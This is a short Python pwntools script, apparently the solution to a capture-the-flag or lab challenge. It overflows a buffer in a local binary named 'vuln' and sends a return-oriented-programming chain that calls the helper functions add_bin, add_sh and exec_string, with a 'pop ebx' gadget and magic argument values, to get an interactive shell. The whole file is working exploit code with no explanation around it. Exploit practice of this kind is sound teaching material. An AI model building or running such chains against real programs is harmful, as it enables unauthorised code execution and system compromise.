from pwn import *

context.binary = exe = ELF('../vuln')

context.log_level = "debug"

# 0x0804901e: pop ebx; ret;

add_bin = exe.symbols["add_bin"]

add_sh = exe.symbols["add_sh"]

exec_string = exe.symbols["exec_string"]

padding = 0x12 + 4

pop_gadget = 0x0804901e

chain = flat(
    'a' * padding,
    add_bin,
    pop_gadget,
    0xdeadbeef,
    add_sh,
    exec_string,
    0xcafebabe,
    0xbadf00d
)

io = process('../vuln')

io.sendline(chain)

io.interactive()